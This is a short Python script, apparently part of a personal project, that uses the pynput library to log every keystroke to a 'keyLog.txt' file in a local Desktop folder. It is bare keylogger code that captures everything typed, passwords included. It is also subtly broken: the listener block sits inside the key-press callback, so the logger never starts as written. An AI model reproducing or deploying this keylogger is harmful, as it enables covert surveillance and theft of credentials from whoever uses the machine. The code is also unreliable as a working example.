from pynput.keyboard import Key, Listener
import logging
log_dir = r"C:/users/Cameron/Desktop/1P03/LawtoCorrect/backend/"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(message)s')
def on_press(key):
    logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()